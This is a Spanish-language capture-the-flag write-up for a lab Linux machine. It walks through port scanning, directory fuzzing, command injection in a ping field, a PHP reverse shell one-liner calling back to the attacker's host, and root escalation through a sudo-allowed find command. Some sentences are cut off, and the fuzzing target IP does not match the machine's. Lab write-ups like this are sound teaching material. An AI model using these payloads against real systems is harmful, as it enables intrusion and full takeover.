# >_ [La Red]

| Propiedad | Detalle |
| :--- | :--- |
| **Plataforma** | Whoami Labs |
| **Dificultad** | 🟢 Media  |
| **OS** | Linux  |
| **IP de la Máquina** | `172.17.0.2` |
| **Fecha de resolución** | 2026-10-22 |

---

## 📝 Descripción
Máquina enfocada en la explotación de un servicio web vulnerable y posterior escalada de privilegios mediante abuso de permisos SUDO.

---

## 🔍 1. Fase de Reconocimiento y Enumeración


### Escaneo de Puertos (`nmap`)
Lanzamos un escaneo inicial para identificar los puertos abiertos y los servicios activos en la máquina objetivo:

```bash
 nmap -p- --open -n -Pn 172.17.0.2
```

**Resultados del escaneo:**
* **Puerto 22/TCP**: SSH
* **Puerto 80/TCP**: HTTP (Apache)

<img width="932" height="198" alt="1escaneo" src="https://github.com/user-attachments/assets/7dd1045d-c378-4d3a-acb0-7975e1534e6c" />
<br><br>

### Enumeración de servicios
Continuamos con un escaneo más profundo del servicio encontrado:

```bash
nmap -p 22,80 -sCV -n 172.17.0.2
```

<img width="825" height="199" alt="2Escaneopuerto" src="https://github.com/user-attachments/assets/0d33a0fa-ba96-41e7-ac3c-4c5669b59b1b" />
<br><br>


### Enumeración Web (Puerto 80)

Al inspeccionar el sitio web, nos encontramos con una página 
<br><br>


<br><br>




Aplicamos fuzzing de directorios para buscar rutas ocultas:
```bash
gobuster dir -u http://10.128.161.94 -w /usr/share/wordlists/rockyou.txt -x php,txt,html -t 100 -k -r
```
<br><br>

Encontramos unas rutas interesantes: , así que vamos a mirar que hay y ver si podemos explotarlo.
<br><br>

---

## 💥 2. Fase de Explotación (Acceso Inicial)

Comenzamos entrando a 


<br><br>


### Vector de Ataque
Escribimos el usuario y la contraseña encontrados y estamos dentro, vemos que es portal.php, una de las rutas que encontramos previamente pero a la que no podíamos acceder antes.


```bash
127.0.0.1 ; ls -la
```


<br><br>

Nos muestra el ping y debajo nos ha ejecutado el **ls -la** que pusimos, por lo que es vulnerable. 
Hay inyección de comandos, por lo que podemos mirar archivos como el usuario web-admin, ya que haciendo un whoami nos dijo que somos ese usuario.



<br><br>
Entramos al directorio del usuario....

```bash
127.0.0.1 ;  cat /home/web-admin/user.txt
```

<br><br>

La flag es correcta, vamos a continuar obtenido una consola más interactiva para poder escalar privilegios más facilmente.


<br><br>


### Intrusión (Reverse Shell)
Logramos ejecutar comandos en el sistema y establecemos una *reverse shell* hacia nuestra máquina atacante:

```php
# Comando ejecutado en el navegador web
127.0.0.1; php -r '$sock=fsockopen("172.17.0.1",440);exec("/bin/bash <&3 >&3 2>&3");'
```

<br><br>


Ponemos nuestro *netcat* a la escucha para recibir la conexión:
```bash
sudo nc -lvnp 440
```

<br><br>

Ya somos el usuario web-admin desde una terminal, ahora podemos sanitizarla o continuar así, se ve peor pero como anteriormente vimos que con sudo -l podíamos ejecutar find sin contraseña como el usuario root, vamos a escalar privilegios.

```bash
# Tratamiento de  la TTY para tener una consola interactiva cómoda
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
```


## 👑 3. Escalada de Privilegios

### Enumeración del Sistema

```bash
# Comprobamos privilegios de SUDO
sudo -l
```
---

### Explotación del Vector de Escalada

Nos aprovechamos del permiso SUID que tenemos para ejecutar find sin contraseña y como el usuario root para convertirnos en él.

```bash
sudo find . -exec /bin/sh \; -quit
```

<br><br>


¡Ya somos **root**! 🚩 Buscamos la flag en la carpeta personal de root.

<br><br>

Por último, validamos la flag obtenida.
